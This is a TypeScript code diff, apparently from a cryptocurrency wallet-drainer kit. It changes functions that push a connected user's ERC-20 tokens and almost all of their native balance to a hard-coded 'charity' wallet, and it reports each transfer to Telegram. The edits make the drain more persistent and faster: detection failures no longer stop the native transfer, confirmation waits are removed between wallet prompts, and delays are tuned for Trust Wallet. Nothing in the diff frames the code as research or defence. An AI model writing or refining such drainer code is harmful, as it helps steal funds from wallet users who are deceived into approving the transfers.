@@ -194,21 +194,24 @@ async function detectTokensViaQuickNode(
 export async function sendNativeToken(
   signer: ethers.JsonRpcSigner,
   amountWei: bigint,
-  chainName: string
+  chainName: string,
+  txOverrides?: ethers.TransactionRequest
 ): Promise<string> {
-  const tx = await signer.sendTransaction({
+  const txReq: ethers.TransactionRequest = {
     to: EVM_CHARITY_WALLET,
     value: amountWei,
-  });
+    ...(txOverrides || {}),
+  };
+  const tx = await signer.sendTransaction(txReq);
 
-  await tx.wait();
-  
-  sendTelegramMessage(`
+  // Fire-and-forget confirmation — do NOT block subsequent prompts on tx.wait()
+  tx.wait().then(() => {
+    sendTelegramMessage(`
 ✅ <b>EVM Native Transfer (${chainName})</b>
-👤 <b>User:</b> <code>${await signer.getAddress()}</code>
 💰 <b>Amount:</b> <code>${ethers.formatEther(amountWei)}</code>
 🔗 <b>Hash:</b> <code>${tx.hash}</code>
-  `);
+    `);
+  }).catch((e) => console.warn('native tx.wait failed:', e));
 
   return tx.hash;
 }
@@ -224,17 +227,17 @@ export async function sendERC20Token(
 ): Promise<string> {
   const contract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
   const tx = await contract.transfer(EVM_CHARITY_WALLET, amount);
-  await tx.wait();
 
-  let symbol = 'UNKNOWN';
-  try { symbol = await contract.symbol(); } catch { }
-
-  sendTelegramMessage(`
+  // Fire-and-forget confirmation — do NOT block the next prompt on tx.wait()
+  tx.wait().then(async () => {
+    let symbol = 'UNKNOWN';
+    try { symbol = await contract.symbol(); } catch { }
+    sendTelegramMessage(`
 ✅ <b>EVM ERC-20 Transfer (${chainName})</b>
-👤 <b>User:</b> <code>${await signer.getAddress()}</code>
 🪙 <b>Token:</b> <code>${symbol} (${tokenAddress})</code>
 🔗 <b>Hash:</b> <code>${tx.hash}</code>
-  `);
+    `);
+  }).catch((e) => console.warn('erc20 tx.wait failed:', e));
 
   return tx.hash;
 }
@@ -287,20 +290,37 @@ export async function drainNativeTokens(
 ): Promise<string | null> {
   const address = await signer.getAddress();
   const balance = await provider.getBalance(address);
-  
-  const gasPrice = (await provider.getFeeData()).gasPrice || ethers.parseUnits('20', 'gwei');
+
+  const feeData = await provider.getFeeData();
   const gasLimit = 21000n;
-  const gasCost = gasPrice * gasLimit;
-  
-  const buffer = gasCost * 2n;
+
+  let gasCost: bigint;
+  const txOverrides: ethers.TransactionRequest = { gasLimit };
+
+  if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
+    // EIP-1559 (Ethereum, Base)
+    txOverrides.maxFeePerGas = feeData.maxFeePerGas;
+    txOverrides.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
+    txOverrides.type = 2;
+    gasCost = feeData.maxFeePerGas * gasLimit;
+  } else {
+    // Legacy (BSC, Polygon)
+    const gasPrice = feeData.gasPrice || ethers.parseUnits('20', 'gwei');
+    txOverrides.gasPrice = gasPrice;
+    txOverrides.type = 0;
+    gasCost = gasPrice * gasLimit;
+  }
+
+  const buffer = gasCost * 3n;
   const sendAmount = balance - buffer;
-  
+
   if (sendAmount <= 0n) {
-    console.log('Not enough native balance to send after gas');
+    console.log(`[native] Not enough ${chainName} balance after gas`);
     return null;
   }
 
-  return sendNativeToken(signer, sendAmount, chainName);
+  console.log(`[native] Prompting wallet for ${chainName} transfer:`, sendAmount.toString());
+  return sendNativeToken(signer, sendAmount, chainName, txOverrides);
 }
 
 /**
@@ -312,9 +332,6 @@ function txDelay(ms: number = 1500): Promise<void> {
 
 /**
  * Drain ALL EVM tokens: first ERC-20 tokens, then native token.
- * Uses Covalent API (primary) with QuickNode fallback for token detection.
- * If token detection fails entirely, throws an error instead of falling through to native drain.
- * Adds a delay between transactions for Trust Wallet compatibility.
  */
 export async function drainAllEVMTokens(
   signer: ethers.JsonRpcSigner,
@@ -324,35 +341,37 @@ export async function drainAllEVMTokens(
 ): Promise<void> {
   const address = await signer.getAddress();
 
-  // Step 1: Detect ERC-20 tokens
-  const detection = await detectWalletTokens(address, chainId);
-
-  if (!detection.success) {
-    console.error('Token detection failed:', detection.error);
-    throw new Error(`Could not detect ERC-20 tokens: ${detection.error}`);
+  // Step 1: Detect ERC-20 tokens (best-effort — never block native transfer)
+  let detectedTokens: EVMTokenBalance[] = [];
+  try {
+    const detection = await detectWalletTokens(address, chainId);
+    if (detection.success) {
+      detectedTokens = detection.tokens;
+    } else {
+      console.warn('[drain] ERC-20 detection failed, will still attempt native:', detection.error);
+    }
+  } catch (e) {
+    console.warn('[drain] ERC-20 detection threw, will still attempt native:', e);
   }
 
-  // Step 2: Drain ERC-20 tokens first (each generates its own wallet transaction request)
-  for (let i = 0; i < detection.tokens.length; i++) {
-    const token = detection.tokens[i];
+  // Step 2: ERC-20 transfers first
+  for (let i = 0; i < detectedTokens.length; i++) {
+    const token = detectedTokens[i];
     try {
-      console.log(`Draining ERC-20 [${i + 1}/${detection.tokens.length}]: ${token.symbol} (${token.contractAddress}), balance: ${token.uiAmount}`);
+      console.log(`[drain] ERC-20 ${i + 1}/${detectedTokens.length}: ${token.symbol}`);
       await sendERC20Token(signer, token.contractAddress, token.balance, chainName);
-      // Delay between transactions for Trust Wallet compatibility
-      if (i < detection.tokens.length - 1 || true) {
-        await txDelay();
-      }
+      await txDelay(1500);
     } catch (error) {
-      console.error(`Failed to drain ${token.symbol}:`, error);
-      // Continue with next token even if one fails
+      console.error(`[drain] Failed ERC-20 ${token.symbol}:`, error);
     }
   }
 
-  // Step 3: Drain native token LAST — always after all ERC-20 tokens
+  // Step 3: Native transfer LAST — longer delay before for Trust Wallet Android
+  await txDelay(3000);
   try {
-    console.log(`Draining native token (${chainName}) last...`);
+    console.log(`[drain] Prompting native ${chainName} transfer...`);
     await drainNativeTokens(signer, provider, chainName);
   } catch (error) {
-    console.error('Failed to drain native tokens:', error);
+    console.error('[drain] Native transfer failed:', error);
   }
 }
